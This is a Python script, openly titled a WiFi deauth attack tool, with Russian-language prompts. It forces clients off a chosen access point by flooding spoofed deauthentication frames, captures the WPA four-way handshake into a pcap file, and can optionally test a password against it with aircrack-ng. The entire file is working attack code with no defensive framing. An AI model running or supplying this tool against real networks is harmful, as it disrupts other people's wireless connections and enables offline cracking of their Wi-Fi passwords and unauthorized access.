#!/usr/bin/env python3

import time
import shutil
import threading
import argparse
import pcapy
from scapy.all import *
from collections import defaultdict

if os.geteuid() != 0:
	print("Нужно запускать от root")
	sys.exit(1)

if not sys.platform.startswith("linux"):
	print("Только для linux-систем!")
	sys.exit(1)

def check_unsigned_int(value):
	try:
		ivalue = int(value)
		if ivalue < 0:
			raise argparse.ArgumentTypeError("Значение должно быть больше 0")
		return ivalue
	except ValueError:
		raise argparse.ArgumentTypeError("Введите целое число")

parser = argparse.ArgumentParser(description="WiFi Deauth Attack Script")
parser.add_argument("-i", "--interface", required=True, help="Интерфейс для прослушивания (например, wlan0mon)")
parser.add_argument("-c", "--channel", type=int, required=True, help="Канал WiFi (например, 11)")
parser.add_argument("-b", "--bssid", required=True, help="BSSID точки доступа (например, 04:5e:a4:6a:28:47)")
parser.add_argument("-s", "--client", required=False, help="MAC-адрес клиента (не обязательный параметр), если не задан, будет рассылка в broadcast")
parser.add_argument("-w", "--pcap-file", required=True, help="Файл для сохранения handshake (например file.pcap)")
parser.add_argument("-d", "--deauth-count", required=False, type=check_unsigned_int, default=5, help="Количество посылок деавторизации")
parser.add_argument("-a", "--aircrack-check", required=False, action=argparse.BooleanOptionalAction, help="Проверка пароля при помощи Aircrack-NG")
parser.add_argument("-p", "--password", required=False, help="Пароль для проверки")
args = parser.parse_args()

if args.aircrack_check and not args.password:
	parser.error("Укажи параметр -p или --password, если нужна проверка пароля")

if args.aircrack_check:
	if shutil.which('aircrack-ng') is None:
		print("aircrack-ng не установлен!")
		sys.exit(1)

print("\n--- Welcome to WiFi Deauth Attack Script ---")

class WiFiDeauth:
	def __init__(self, interface, bssid, client, channel, deauth_count, pcap_file, aircrack_check, password):
		self.interface = interface
		self.bssid = bssid.lower()
		
		if client is None:
			self.client = 'ff:ff:ff:ff:ff:ff'
		else:
			self.client = client.lower()

		self.BSSID = bssid.upper()
		self.CLIENT = self.client.upper()
		self.pcap_file = pcap_file
		
		self.beacon_detect_flag = False
		self.eapol_detect_flag = False
		self.all_keys_flag = False
		self.key_pairs_flag = False
		self.eapol_detect_falg = True
		
		self.key1_cnt = 0
		self.key2_cnt = 0
		self.key3_cnt = 0
		self.key4_cnt = 0
		self.ap_acks = 0
		self.cli_acks = 0
		
		self.packets = []
		
		self.deauth_packets = 127
		self.deauth_count = deauth_count
		self.current_deauth = 0
		self.deauth_done_flag = False
		self.deauth_done_start_time = 0
				
		self.eapol_detect_elapsed_time = 0

		self.keys_receiving_start_time = 0
		self.keys_receiving_done_flag = False
		self.keys_receiving_timeout_flag = False
		
		self.aircrack_check = aircrack_check
		self.password = password
		
		self.interrupt_flag = False
		
		print(f"[+] Switching {args.interface} to channel {args.channel}")
		subprocess.run(["iwconfig", interface, "channel", str(channel)], capture_output=True, text=True)
		print(f"[+] Waiting beacon frame from {self.BSSID}")
	
	def aircrack_check_pass(self, cap_file, password):
		with open('pass.txt', 'w', encoding="utf-8") as f:
			f.write(password)
			
		if os.path.exists('pass.txt'):
			aircrack = subprocess.run(["aircrack-ng", "-b", self.BSSID, cap_file, "-w", "pass.txt"], capture_output=True, text=True, timeout=10).stdout
			os.remove('pass.txt')
			return f'KEY FOUND! [ {password} ]' in aircrack
		return False
	
	def wpaclean(self, cap_file, out_cap_file):
		subprocess.run(["wpaclean", out_cap_file, cap_file], capture_output=True, text=True)
	
	def send_deauth(self):
		pcap = pcapy.open_live(self.interface, 100, 1, 9)
		for i in range(self.deauth_count):
			
			if self.client != 'ff:ff:ff:ff:ff:ff':
				print(f"[+] Send deauth to {self.BSSID} as {self.CLIENT} ({i +1} / {self.deauth_count})")
			else:
				print(f"[+] Send deauth to broadcast as {self.BSSID} ({i +1} / {self.deauth_count})")
				
			self.current_deauth = i
			for pnt_num in range(self.deauth_packets):
				deauth_pkt = bytes(RadioTap() / Dot11(addr1=self.client, addr2=self.bssid, addr3=self.bssid, SC=(pnt_num << 4)) / Dot11Deauth(reason=7))
				pcap.sendpacket(deauth_pkt)
			time.sleep(1)

	def packet_handler(self, pkt):
		if not self.beacon_detect_flag:
			if pkt.haslayer(Dot11Elt) and pkt[Dot11].addr3 == self.bssid:
				ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else None
				print(f"[+] Done, ssid=\"{ssid}\", waiting EAPOL data")
				self.beacon_detect_flag = True
				self.packets.append(pkt)
				threading.Thread(target=self.send_deauth).start()

		if pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3 and (pkt[Dot11].addr1 == self.bssid or pkt[Dot11].addr2 == self.bssid) and self.beacon_detect_flag and not self.all_keys_flag:
			if not self.eapol_detect_falg:
				self.eapol_detect_falg = True
			
			self.packets.append(pkt)
			
			raw_data = bytes(pkt[EAPOL])
			key_info = int.from_bytes(raw_data[5:7], 'big')
			
			if not self.all_keys_flag and self.eapol_detect_falg:
				if key_info == 0x008a:
					self.packets.append(pkt)
					self.key1_cnt += 1
					print(f"[+] Received M1 Message")
				elif key_info == 0x010a:
					self.packets.append(pkt)
					self.key2_cnt += 1
					print(f"[+] Received M2 Message")
				elif key_info == 0x13ca:
					self.packets.append(pkt)
					self.key3_cnt += 1
					print(f"[+] Received M3 Message")
				elif key_info == 0x030a:
					self.packets.append(pkt)
					self.key4_cnt += 1
					print(f"[+] Received M4 Message")
				else:
					if key_info == 0x0088 or key_info == 0x0108 or key_info == 0x13c8 or key_info == 0x0308:
						print("[-] WPA3 EAPOL Detected! Not supported")
					else:
						print(f"[-] Unknown EAPOL Data!")
		
		if (self.current_deauth +1) == self.deauth_count and not self.deauth_done_flag:
			print("[+] All deauth packets sent, waiting EAPOL lasted messages")
			self.deauth_done_flag = True
			self.keys_receiving_start_time = time.time()
		
		if self.deauth_done_flag:
			elapsed_time = round(time.time() - self.keys_receiving_start_time)
			
			if elapsed_time >= 5:
				if self.key1_cnt > 0 and self.key2_cnt > 0 and self.key3_cnt > 0 and self.key4_cnt > 0:
					if not self.all_keys_flag:
						self.all_keys_flag = True						
						wrpcap(self.pcap_file, self.packets)
						print(f"[+] All keys ({len(self.packets)}) received. Created \"{self.pcap_file}\"")
						
						if self.aircrack_check:
							print("[+] Running aircrack-ng")
							if self.aircrack_check_pass(self.pcap_file, self.password):
								print(f"[+] Checking aircrack-ng: OK, password=\"{self.password}\"")
							else:
								print(f"[-] Checking aircrack-ng: FAIL, password \"{self.password}\" incorrect") 
						
						self.interrupt_flag = True
				else:
					if not self.keys_receiving_timeout_flag:
						self.keys_receiving_timeout_flag = True
						self.interrupt_flag = True
						print("[-] EAPOL keys receiving timeout!")
	
	def start_sniffing(self):
		sniff(iface=self.interface, prn=self.packet_handler, stop_filter=lambda pkt: (self.interrupt_flag))

sniffer = WiFiDeauth(args.interface, args.bssid, args.client, args.channel, args.deauth_count, args.pcap_file, args.aircrack_check, args.password)
sniffer.start_sniffing()
